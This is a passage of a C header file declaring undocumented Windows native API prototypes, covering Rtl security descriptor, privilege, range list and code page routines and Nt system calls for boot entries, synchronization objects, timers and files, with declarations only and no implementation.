    IN SECURITY_DESCRIPTOR_CONTROL Control,
    IN OUT PULONG Revision
    );

NTSTATUS
NTAPI
RtlSetDaclSecurityDescriptor (
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN DaclPresent,
    PACL Dacl,
    BOOLEAN DaclDefaulted
    );

NTSTATUS
NTAPI
RtlGetDaclSecurityDescriptor (
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PBOOLEAN DaclPresent,
    OUT PACL *Dacl,
    OUT PBOOLEAN DaclDefaulted
    );

BOOLEAN
NTAPI
RtlGetSecurityDescriptorRMControl(
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PUCHAR RMControl
    );

VOID
NTAPI
RtlSetSecurityDescriptorRMControl(
    IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN PUCHAR RMControl OPTIONAL
    );

NTSTATUS
NTAPI
RtlSetSaclSecurityDescriptor (
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN SaclPresent,
    PACL Sacl,
    BOOLEAN SaclDefaulted
    );

NTSTATUS
NTAPI
RtlGetSaclSecurityDescriptor (
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PBOOLEAN SaclPresent,
    OUT PACL *Sacl,
    OUT PBOOLEAN SaclDefaulted
    );

NTSTATUS
NTAPI
RtlSetGroupSecurityDescriptor (
    IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN PSID Group OPTIONAL,
    IN BOOLEAN GroupDefaulted OPTIONAL
    );

NTSTATUS
NTAPI
RtlGetGroupSecurityDescriptor (
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor,
    OUT PSID *Group,
    OUT PBOOLEAN GroupDefaulted
    );

NTSTATUS
NTAPI
RtlMakeSelfRelativeSD (
    IN PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    OUT PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    IN OUT PULONG BufferLength
    );

NTSTATUS
NTAPI
RtlAbsoluteToSelfRelativeSD (
    IN PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    OUT PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    IN OUT PULONG BufferLength
    );

NTSTATUS
NTAPI
RtlSelfRelativeToAbsoluteSD (
    IN PSECURITY_DESCRIPTOR SelfRelativeSecurityDescriptor,
    OUT OPTIONAL PSECURITY_DESCRIPTOR AbsoluteSecurityDescriptor,
    IN OUT PULONG AbsoluteSecurityDescriptorSize,
    OUT OPTIONAL PACL Dacl,
    IN OUT PULONG DaclSize,
    OUT OPTIONAL PACL Sacl,
    IN OUT PULONG SaclSize,
    OUT OPTIONAL PSID Owner,
    IN OUT PULONG OwnerSize,
    OUT OPTIONAL PSID PrimaryGroup,
    IN OUT PULONG PrimaryGroupSize
    );

NTSTATUS
NTAPI
RtlSelfRelativeToAbsoluteSD2 (
    IN OUT PSECURITY_DESCRIPTOR pSelfRelativeSecurityDescriptor,
    IN OUT PULONG pBufferSize
    );

NTSTATUS
NTAPI
RtlNewSecurityGrantedAccess (
    ACCESS_MASK DesiredAccess,
    PPRIVILEGE_SET Privileges,
    PULONG Length,
    HANDLE Token,
    PGENERIC_MAPPING GenericMapping,
    PACCESS_MASK RemainingDesiredAccess
    );

NTSTATUS
NTAPI
RtlMapSecurityErrorToNtStatus (
    SECURITY_STATUS Error
    );

NTSTATUS
NTAPI
RtlImpersonateSelf (
    IN SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
    );

NTSTATUS
NTAPI
RtlAdjustPrivilege (
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN Client,
    PBOOLEAN WasEnabled
    );

NTSTATUS
NTAPI
RtlAcquirePrivilege (
    PULONG Privilege,
    ULONG NumPriv,
    ULONG Flags,
    PVOID *ReturnedState
    );

VOID
NTAPI
RtlReleasePrivilege (
    PVOID StatePointer
    );

VOID
NTAPI
RtlRunEncodeUnicodeString(
    PUCHAR          Seed        OPTIONAL,
    PUNICODE_STRING String
    );

VOID
NTAPI
RtlRunDecodeUnicodeString(
    UCHAR           Seed,
    PUNICODE_STRING String
    );

VOID
NTAPI
RtlEraseUnicodeString(
    PUNICODE_STRING String
    );

NTSTATUS
NTAPI
RtlFindMessage(
    PVOID DllHandle,
    ULONG MessageTableId,
    ULONG MessageLanguageId,
    ULONG MessageId,
    PMESSAGE_RESOURCE_ENTRY *MessageEntry
    );

NTSTATUS
NTAPI
RtlFormatMessage(
	IN PWSTR MessageFormat,
	IN ULONG MaximumWidth,
	IN BOOLEAN IgnoreInserts,
	IN BOOLEAN ArgumentsAreAnsi,
	IN BOOLEAN ArgumentsAreAnArray,
	IN va_list *Arguments,
	OUT PWSTR Buffer,
	IN ULONG Length,
	OUT OPTIONAL PULONG ReturnLength
    );

NTSTATUS
NTAPI
RtlFormatMessageEx(
	IN PWSTR MessageFormat,
	IN ULONG MaximumWidth,
	IN BOOLEAN IgnoreInserts,
	IN BOOLEAN ArgumentsAreAnsi,
	IN BOOLEAN ArgumentsAreAnArray,
	IN va_list *Arguments,
	OUT PWSTR Buffer,
	IN ULONG Length,
	OUT OPTIONAL PULONG ReturnLength,
	OUT OPTIONAL PPARSE_MESSAGE_CONTEXT ParseContext
    );

NTSTATUS
NTAPI
RtlInitializeRXact(
    IN HANDLE RootRegistryKey,
    IN BOOLEAN CommitIfNecessary,
    OUT PRTL_RXACT_CONTEXT *RXactContext
    );

NTSTATUS
NTAPI
RtlStartRXact(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

NTSTATUS
NTAPI
RtlAbortRXact(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

NTSTATUS
NTAPI
RtlAddAttributeActionToRXact(
    IN PRTL_RXACT_CONTEXT RXactContext,
    IN RTL_RXACT_OPERATION Operation,
    IN PUNICODE_STRING SubKeyName,
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING AttributeName,
    IN ULONG NewValueType,
    IN PVOID NewValue,
    IN ULONG NewValueLength
    );

NTSTATUS
NTAPI
RtlAddActionToRXact(
    IN PRTL_RXACT_CONTEXT RXactContext,
    IN RTL_RXACT_OPERATION Operation,
    IN PUNICODE_STRING SubKeyName,
    IN ULONG NewKeyValueType,
    IN PVOID NewKeyValue OPTIONAL,
    IN ULONG NewKeyValueLength
    );

NTSTATUS
NTAPI
RtlApplyRXact(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

NTSTATUS
NTAPI
RtlApplyRXactNoFlush(
    IN PRTL_RXACT_CONTEXT RXactContext
    );

ULONG
NTAPI
RtlNtStatusToDosError (
   NTSTATUS Status
   );

ULONG
NTAPI
RtlNtStatusToDosErrorNoTeb (
   NTSTATUS Status
   );

PPEB
RtlGetCurrentPeb (
    VOID
    );

NTSTATUS
NTAPI
RtlCustomCPToUnicodeN(
	IN PCPTABLEINFO CustomCP,
	OUT PWCH UnicodeString,
	IN ULONG MaxBytesInUnicodeString,
	OUT OPTIONAL PULONG BytesInUnicodeString,
	IN PCH CustomCPString,
	IN ULONG BytesInCustomCPString
    );

NTSTATUS
NTAPI
RtlUnicodeToCustomCPN(
	IN PCPTABLEINFO CustomCP,
	OUT PCH CustomCPString,
	IN ULONG MaxBytesInCustomCPString,
	OUT OPTIONAL PULONG BytesInCustomCPString,
	IN PWCH UnicodeString,
	IN ULONG BytesInUnicodeString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeToCustomCPN(
    IN PCPTABLEINFO CustomCP,
    OUT PCH CustomCPString,
    IN ULONG MaxBytesInCustomCPString,
    OUT OPTIONAL PULONG BytesInCustomCPString,
    IN PWCH UnicodeString,
    IN ULONG BytesInUnicodeString
    );

VOID
NTAPI
RtlInitCodePageTable(
    IN PUSHORT TableBase,
    OUT PCPTABLEINFO CodePageTable
    );

VOID
NTAPI
RtlInitNlsTables(
    IN PUSHORT AnsiNlsBase,
    IN PUSHORT OemNlsBase,
    IN PUSHORT LanguageNlsBase,
    OUT PNLSTABLEINFO TableInfo
    );

VOID
NTAPI
RtlResetRtlTranslations(
    PNLSTABLEINFO TableInfo
    );

VOID
NTAPI
RtlGetDefaultCodePage(
    OUT PUSHORT AnsiCodePage,
    OUT PUSHORT OemCodePage
    );

VOID
NTAPI
RtlInitializeRangeList(
    IN OUT PRTL_RANGE_LIST RangeList
    );

VOID
NTAPI
RtlFreeRangeList(
    IN PRTL_RANGE_LIST RangeList
    );

NTSTATUS
NTAPI
RtlCopyRangeList(
    OUT PRTL_RANGE_LIST CopyRangeList,
    IN PRTL_RANGE_LIST RangeList
    );

NTSTATUS
NTAPI
RtlAddRange(
    IN OUT PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Start,
    IN ULONGLONG End,
    IN UCHAR Attributes,
    IN ULONG Flags,
    IN PVOID UserData,  OPTIONAL
    IN PVOID Owner      OPTIONAL
    );

NTSTATUS
NTAPI
RtlDeleteRange(
    IN OUT PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Start,
    IN ULONGLONG End,
    IN PVOID Owner
    );

NTSTATUS
NTAPI
RtlDeleteOwnersRanges(
    IN OUT PRTL_RANGE_LIST RangeList,
    IN PVOID Owner
    );

NTSTATUS
NTAPI
RtlFindRange(
    IN PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Minimum,
    IN ULONGLONG Maximum,
    IN ULONG Length,
    IN ULONG Alignment,
    IN ULONG Flags,
    IN UCHAR AttributeAvailableMask,
    IN PVOID Context OPTIONAL,
    IN PRTL_CONFLICT_RANGE_CALLBACK Callback OPTIONAL,
    OUT PULONGLONG Start
    );

NTSTATUS
NTAPI
RtlIsRangeAvailable(
    IN PRTL_RANGE_LIST RangeList,
    IN ULONGLONG Start,
    IN ULONGLONG End,
    IN ULONG Flags,
    IN UCHAR AttributeAvailableMask,
    IN PVOID Context OPTIONAL,
    IN PRTL_CONFLICT_RANGE_CALLBACK Callback OPTIONAL,
    OUT PBOOLEAN Available
    );

NTSTATUS
NTAPI
RtlGetFirstRange(
    IN PRTL_RANGE_LIST RangeList,
    OUT PRTL_RANGE_LIST_ITERATOR Iterator,
    OUT PRTL_RANGE *Range
    );

NTSTATUS
NTAPI
RtlGetLastRange(
    IN PRTL_RANGE_LIST RangeList,
    OUT PRTL_RANGE_LIST_ITERATOR Iterator,
    OUT PRTL_RANGE *Range
    );

NTSTATUS
NTAPI
RtlGetNextRange(
    IN OUT PRTL_RANGE_LIST_ITERATOR Iterator,
    OUT PRTL_RANGE *Range,
    IN BOOLEAN MoveForwards
    );

NTSTATUS
NTAPI
RtlMergeRangeLists(
    OUT PRTL_RANGE_LIST MergedRangeList,
    IN PRTL_RANGE_LIST RangeList1,
    IN PRTL_RANGE_LIST RangeList2,
    IN ULONG Flags
    );

NTSTATUS
NTAPI
RtlInvertRangeList(
    OUT PRTL_RANGE_LIST InvertedRangeList,
    IN PRTL_RANGE_LIST RangeList
    );

NTSTATUS
NTAPI
RtlVolumeDeviceToDosName(
    IN  PVOID           VolumeDeviceObject,
    OUT PUNICODE_STRING DosName
    );

NTSTATUS
NTAPI
RtlCreateSystemVolumeInformationFolder(
    IN  PUNICODE_STRING VolumeRootPath
    );

#if defined(_WINNT_) && (_MSC_VER < 1300)
typedef POSVERSIONINFOW PRTL_OSVERSIONINFOW;
typedef POSVERSIONINFOEXW PRTL_OSVERSIONINFOEXW;

typedef LONG (NTAPI *PVECTORED_EXCEPTION_HANDLER)( struct _EXCEPTION_POINTERS *ExceptionInfo );
typedef VOID (NTAPI * APC_CALLBACK_FUNCTION) (DWORD , PVOID, PVOID);

typedef const GUID *LPCGUID;

#endif

NTSTATUS
RtlGetVersion(
    OUT PRTL_OSVERSIONINFOW lpVersionInformation
    );

NTSTATUS
RtlVerifyVersionInfo(
    IN PRTL_OSVERSIONINFOEXW VersionInfo,
    IN ULONG TypeMask,
    IN ULONGLONG  ConditionMask
    );

BOOLEAN
RtlFlushSecureMemoryCache(
    PVOID   lpAddr,
    SIZE_T  size
    );

LONG
NTAPI
RtlGetLastWin32Error(
    VOID
    );

VOID
NTAPI
RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
    NTSTATUS Status
    );

VOID
NTAPI
RtlSetLastWin32Error(
    LONG Win32Error
    );

VOID
NTAPI
RtlRestoreLastWin32Error(
    LONG Win32Error
    );

NTSTATUS
NTAPI
RtlGetSetBootStatusData(
    IN HANDLE Handle,
    IN BOOLEAN Get,
    IN RTL_BSD_ITEM_TYPE DataItem,
    IN PVOID DataBuffer,
    IN ULONG DataBufferLength,
    OUT PULONG ByteRead OPTIONAL
    );

NTSTATUS
NTAPI
RtlLockBootStatusData(
    OUT PHANDLE BootStatusDataHandle
    );

VOID
NTAPI
RtlUnlockBootStatusData(
    IN HANDLE BootStatusDataHandle
    );

NTSTATUS
NTAPI
RtlCreateBootStatusDataFile(
    VOID
    );

//

//
// begin_ntapi
NTSTATUS
NTAPI
NtDelayExecution(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval
    );


NTSTATUS
NTAPI
NtQuerySystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    OUT PWSTR VariableValue,
    IN USHORT ValueLength,
    OUT OPTIONAL PUSHORT ReturnLength
    );


NTSTATUS
NTAPI
NtSetSystemEnvironmentValue (
    IN PUNICODE_STRING VariableName,
    IN PUNICODE_STRING VariableValue
    );


NTSTATUS
NTAPI
NtQuerySystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    OUT OPTIONAL PVOID Value,
    IN OUT PULONG ValueLength,
    OUT OPTIONAL PULONG Attributes
    );


NTSTATUS
NTAPI
NtSetSystemEnvironmentValueEx (
    IN PUNICODE_STRING VariableName,
    IN LPGUID VendorGuid,
    IN OPTIONAL PVOID Value,
    IN ULONG ValueLength,
    IN ULONG Attributes
    );


NTSTATUS
NTAPI
NtEnumerateSystemEnvironmentValuesEx (
    IN ULONG InformationClass,
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );


NTSTATUS
NTAPI
NtAddBootEntry (
    IN PBOOT_ENTRY BootEntry,
    OUT OPTIONAL PULONG Id
    );


NTSTATUS
NTAPI
NtDeleteBootEntry (
    IN ULONG Id
    );


NTSTATUS
NTAPI
NtModifyBootEntry (
    IN PBOOT_ENTRY BootEntry
    );


NTSTATUS
NTAPI
NtEnumerateBootEntries (
    OUT OPTIONAL PVOID Buffer,
    IN OUT PULONG BufferLength
    );


NTSTATUS
NTAPI
NtQueryBootEntryOrder (
    OUT OPTIONAL PULONG Ids,
    IN OUT PULONG Count
	);


NTSTATUS
NTAPI
NtSetBootEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );


NTSTATUS
NTAPI
NtQueryBootOptions (
    OUT OPTIONAL PBOOT_OPTIONS BootOptions,
    IN OUT PULONG BootOptionsLength
    );


NTSTATUS
NTAPI
NtSetBootOptions (
    IN PBOOT_OPTIONS BootOptions,
    IN ULONG FieldsToChange
    );


NTSTATUS
NTAPI
NtTranslateFilePath (
    IN PFILE_PATH InputFilePath,
    IN ULONG OutputType,
    OUT OPTIONAL PFILE_PATH OutputFilePath,
    IN OUT OPTIONAL PULONG OutputFilePathLength
    );


NTSTATUS
NTAPI
NtAddDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry,
    OUT OPTIONAL PULONG Id
    );


NTSTATUS
NTAPI
NtDeleteDriverEntry (
    IN ULONG Id
    );


NTSTATUS
NTAPI
NtModifyDriverEntry (
    IN PEFI_DRIVER_ENTRY DriverEntry
    );


NTSTATUS
NTAPI
NtEnumerateDriverEntries (
    OUT PVOID Buffer,
    IN OUT PULONG BufferLength
    );


NTSTATUS
NTAPI
NtQueryDriverEntryOrder (
    OUT PULONG Ids,
    IN OUT PULONG Count
    );


NTSTATUS
NTAPI
NtSetDriverEntryOrder (
    IN PULONG Ids,
    IN ULONG Count
    );


NTSTATUS
NTAPI
NtClearEvent (
    IN HANDLE EventHandle
    );


NTSTATUS
NTAPI
NtCreateEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState
    );


NTSTATUS
NTAPI
NtOpenEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtPulseEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );


NTSTATUS
NTAPI
NtQueryEvent (
    IN HANDLE EventHandle,
    IN EVENT_INFORMATION_CLASS EventInformationClass,
    OUT PVOID EventInformation,
    IN ULONG EventInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtResetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );


NTSTATUS
NTAPI
NtSetEvent (
    IN HANDLE EventHandle,
    OUT OPTIONAL PLONG PreviousState
    );


NTSTATUS
NTAPI
NtSetEventBoostPriority (
    IN HANDLE EventHandle
    );


NTSTATUS
NTAPI
NtCreateEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtOpenEventPair (
    OUT PHANDLE EventPairHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtWaitLowEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtWaitHighEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetLowWaitHighEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetHighWaitLowEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetLowEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtSetHighEventPair (
    IN HANDLE EventPairHandle
    );


NTSTATUS
NTAPI
NtCreateMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN InitialOwner
    );


NTSTATUS
NTAPI
NtOpenMutant (
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryMutant (
    IN HANDLE MutantHandle,
    IN MUTANT_INFORMATION_CLASS MutantInformationClass,
    OUT PVOID MutantInformation,
    IN ULONG MutantInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtReleaseMutant (
    IN HANDLE MutantHandle,
    OUT OPTIONAL PLONG PreviousCount
    );


NTSTATUS
NTAPI
NtCreateSemaphore (
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN LONG InitialCount,
    IN LONG MaximumCount
    );


NTSTATUS
NTAPI
NtOpenSemaphore(
    OUT PHANDLE SemaphoreHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQuerySemaphore (
    IN HANDLE SemaphoreHandle,
    IN SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    OUT PVOID SemaphoreInformation,
    IN ULONG SemaphoreInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtReleaseSemaphore(
    IN HANDLE SemaphoreHandle,
    IN LONG ReleaseCount,
    OUT OPTIONAL PLONG PreviousCount
    );


NTSTATUS
NTAPI
NtCreateTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TIMER_TYPE TimerType
    );


NTSTATUS
NTAPI
NtOpenTimer (
    OUT PHANDLE TimerHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtCancelTimer (
    IN HANDLE TimerHandle,
    OUT OPTIONAL PBOOLEAN CurrentState
    );


NTSTATUS
NTAPI
NtQueryTimer (
    IN HANDLE TimerHandle,
    IN TIMER_INFORMATION_CLASS TimerInformationClass,
    OUT PVOID TimerInformation,
    IN ULONG TimerInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetTimer (
    IN HANDLE TimerHandle,
    IN PLARGE_INTEGER DueTime,
    IN OPTIONAL PTIMER_APC_ROUTINE TimerApcRoutine,
    IN OPTIONAL PVOID TimerContext,
    IN BOOLEAN ResumeTimer,
    IN OPTIONAL LONG Period,
    OUT OPTIONAL PBOOLEAN PreviousState
    );


NTSTATUS
NTAPI
NtQuerySystemTime (
    OUT PLARGE_INTEGER SystemTime
    );


NTSTATUS
NTAPI
NtSetSystemTime (
    IN OPTIONAL PLARGE_INTEGER SystemTime,
    OUT OPTIONAL PLARGE_INTEGER PreviousTime
    );


NTSTATUS
NTAPI
NtQueryTimerResolution (
    OUT PULONG MaximumTime,
    OUT PULONG MinimumTime,
    OUT PULONG CurrentTime
    );


NTSTATUS
NTAPI
NtSetTimerResolution (
    IN ULONG DesiredTime,
    IN BOOLEAN SetResolution,
    OUT PULONG ActualTime
    );


NTSTATUS
NTAPI
NtAllocateLocallyUniqueId (
    OUT PLUID Luid
    );


NTSTATUS
NTAPI
NtSetUuidSeed (
    IN PCHAR Seed
    );


NTSTATUS
NTAPI
NtAllocateUuids (
    OUT PULARGE_INTEGER Time,
    OUT PULONG Range,
    OUT PULONG Sequence,
    OUT PCHAR Seed
    );


NTSTATUS
NTAPI
NtCreateProfile (
    OUT PHANDLE ProfileHandle,
    IN HANDLE Process OPTIONAL,
    IN PVOID ProfileBase,
    IN SIZE_T ProfileSize,
    IN ULONG BucketSize,
    IN PULONG Buffer,
    IN ULONG BufferSize,
    IN KPROFILE_SOURCE ProfileSource,
    IN KAFFINITY Affinity
    );


NTSTATUS
NTAPI
NtStartProfile (
    IN HANDLE ProfileHandle
    );


NTSTATUS
NTAPI
NtStopProfile (
    IN HANDLE ProfileHandle
    );


NTSTATUS
NTAPI
NtSetIntervalProfile (
    IN ULONG Interval,
    IN KPROFILE_SOURCE Source
    );


NTSTATUS
NTAPI
NtQueryIntervalProfile (
    IN KPROFILE_SOURCE ProfileSource,
    OUT PULONG Interval
    );


NTSTATUS
NTAPI
NtQueryPerformanceCounter (
    OUT PLARGE_INTEGER PerformanceCounter,
    OUT OPTIONAL PLARGE_INTEGER PerformanceFrequency
    );


NTSTATUS
NTAPI
NtCreateKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtOpenKeyedEvent (
    OUT PHANDLE KeyedEventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtReleaseKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForKeyedEvent (
    IN HANDLE KeyedEventHandle,
    IN PVOID KeyValue,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtQuerySystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetSystemInformation (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OPTIONAL PVOID SystemInformation,
    IN ULONG SystemInformationLength
    );


NTSTATUS
NTAPI
NtSystemDebugControl (
    IN SYSDBG_COMMAND Command,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtRaiseHardError (
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN ULONG UnicodeStringParameterMask,
    IN OPTIONAL PULONG_PTR Parameters,
    IN ULONG ValidResponseOptions,
    OUT PULONG Response
    );


NTSTATUS
NTAPI
NtQueryDefaultLocale (
    IN BOOLEAN UserProfile,
    OUT PLCID DefaultLocaleId
    );


NTSTATUS
NTAPI
NtSetDefaultLocale (
    IN BOOLEAN UserProfile,
    IN LCID DefaultLocaleId
    );


NTSTATUS
NTAPI
NtQueryInstallUILanguage (
    OUT LANGID *InstallUILanguageId
    );


NTSTATUS
NTAPI
NtQueryDefaultUILanguage (
    OUT LANGID *DefaultUILanguageId
    );


NTSTATUS
NTAPI
NtSetDefaultUILanguage (
    IN LANGID DefaultUILanguageId
    );


NTSTATUS
NTAPI
NtSetDefaultHardErrorPort(
    IN HANDLE DefaultHardErrorPort
    );


NTSTATUS
NTAPI
NtShutdownSystem (
    IN SHUTDOWN_ACTION Action
    );


NTSTATUS
NTAPI
NtDisplayString (
    IN PUNICODE_STRING String
    );


NTSTATUS
NTAPI
NtAddAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );


NTSTATUS
NTAPI
NtFindAtom (
    IN OPTIONAL PWSTR AtomName,
    IN ULONG Length,
    OUT OPTIONAL PRTL_ATOM Atom
    );


NTSTATUS
NTAPI
NtDeleteAtom (
    IN RTL_ATOM Atom
    );


NTSTATUS
NTAPI
NtQueryInformationAtom(
    IN RTL_ATOM Atom,
    IN ATOM_INFORMATION_CLASS AtomInformationClass,
    OUT OPTIONAL PVOID AtomInformation,
    IN ULONG AtomInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtCancelIoFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSTATUS
NTAPI
NtCreateNamedPipeFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG ShareAccess,
     IN ULONG CreateDisposition,
     IN ULONG CreateOptions,
     IN ULONG NamedPipeType,
     IN ULONG ReadMode,
     IN ULONG CompletionMode,
     IN ULONG MaximumInstances,
     IN ULONG InboundQuota,
     IN ULONG OutboundQuota,
     IN OPTIONAL PLARGE_INTEGER DefaultTimeout
     );


NTSTATUS
NTAPI
NtCreateMailslotFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG CreateOptions,
     IN ULONG MailslotQuota,
     IN ULONG MaximumMessageSize,
     IN PLARGE_INTEGER ReadTimeout
     );


NTSTATUS
NTAPI
NtDeleteFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtFlushBuffersFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSTATUS
NTAPI
NtNotifyChangeDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree
    );


NTSTATUS
NTAPI
NtQueryAttributesFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_BASIC_INFORMATION FileInformation
    );


NTSTATUS
NTAPI
NtQueryFullAttributesFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_NETWORK_OPEN_INFORMATION FileInformation
    );


NTSTATUS
NTAPI
NtQueryEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN PVOID EaList,
    IN ULONG EaListLength,
    IN OPTIONAL PULONG EaIndex OPTIONAL,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
NtCreateFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER AllocationSize,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN OPTIONAL PVOID EaBuffer,
    IN ULONG EaLength
    );


NTSTATUS
NTAPI
NtDeviceIoControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );


NTSTATUS
NTAPI
NtFsControlFile (
    IN HANDLE FileHandle,
